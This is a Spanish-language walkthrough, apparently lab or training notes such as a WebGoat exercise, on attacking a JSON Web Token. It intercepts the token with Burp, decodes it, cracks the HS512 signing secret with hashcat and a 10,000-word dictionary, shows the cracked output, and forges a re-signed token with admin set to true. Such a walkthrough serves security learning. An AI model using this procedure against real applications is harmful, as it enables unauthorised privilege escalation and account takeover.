# JWT tokens

JsonWebTokens 

**********************************************************************

# Proceso
Capturamos la petición

# 1) Capturamos el access token con ayuda de burp
## Access token
```
eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1OTQ1MjI5NzEsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiU3lsdmVzdGVyIn0.cmya1cEk7cRqfMLN5RT0yMDOxQu1bsRvdnZE00hsAfxDp4smEsCNZp5_ncymxyu0n6Hch8lYdGQ3SiawIRNqwQ
```

Dado el RFC de JWT sabemos que el token se compone de 3 partes y está separado por `.`

## Access token explain
```
Header:
	eyJhbGciOiJIUzUxMiJ9
Claim: 
	eyJpYXQiOjE1OTQ1MjI5NzEsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiU3lsdmVzdGVyIn0
Signature:
	cmya1cEk7cRqfMLN5RT0yMDOxQu1bsRvdnZE00hsAfxDp4smEsCNZp5_ncymxyu0n6Hch8lYdGQ3SiawIRNqwQ
```

## Access token decoded
```
Header:
	{"alg":"HS512"}
Claim: 
	{"iat":1594522971,"admin":"false","user":"Sylvester"}
Signature:
	?
```

***************************************************************

# 2) Crackeamos el access token para encontrar el "secret" con el que se cifro

Con Ayuda de hashcat trataremos de encontrar el `secret` mediante un ataque de diccionario

1. Creamos un archivo token.txt con nuestro token
2. Usamos el diccionario proporcionado por [first20hours](https://github.com/first20hours/google-10000-english/blob/master/google-10000-english.txt)
3. Usamos la herramienta hashcat

La sintaxis de la herramienta es la siguiente:
```bash
# Using a Wordlist:  
hashcat -a0 -m 16500 text.hash [dict]

# Pure Brute force attack:  
hashcat -a3 -m 16500 text.hash
```

Para nuestro caso sería:
```bash
# Using a Wordlist:  
hashcat -a0 -m 16500 token.txt google-10000-english.txt
```

Lo que nos dará el siguiente output
```
Dictionary cache built:
* Filename..: google-10000-english.txt
* Passwords.: 10000
* Bytes.....: 75888
* Keyspace..: 10000
* Runtime...: 0 secs

eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1OTQ1MjI5NzEsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiU3lsdmVzdGVyIn0.cmya1cEk7cRqfMLN5RT0yMDOxQu1bsRvdnZE00hsAfxDp4smEsCNZp5_ncymxyu0n6Hch8lYdGQ3SiawIRNqwQ:victory
```

Donde podemos observar que el `secret` es `victory`

***************************************************************
# 3) Modificamos y creamos un nuevo token

Una vez que tenemos el `secret` podemos crear un nuevo token correctamente firmado.
Para esto, hacemos lo siguiente:

1. Abrimos jwt.io
2. Pegamos nuestro token original
3. Modificamos `"admin": "false"`, a `"admin": "true"`
4. Ingresamos nuestro `secret` que en este caso es `victory`
5. Copiamos el nuevo token y lo pegamos en la función `repeater` de burp

***********************************************************************

# Materiales de ayuda
+ https://gchq.github.io/CyberChef/
+ https://jwt.io/
+ https://security.stackexchange.com/questions/200918/using-hashcat-in-order-to-crack-the-jwt-signature-in-webgoat
+ https://github.com/first20hours/google-10000-english/blob/master/google-10000-english.txt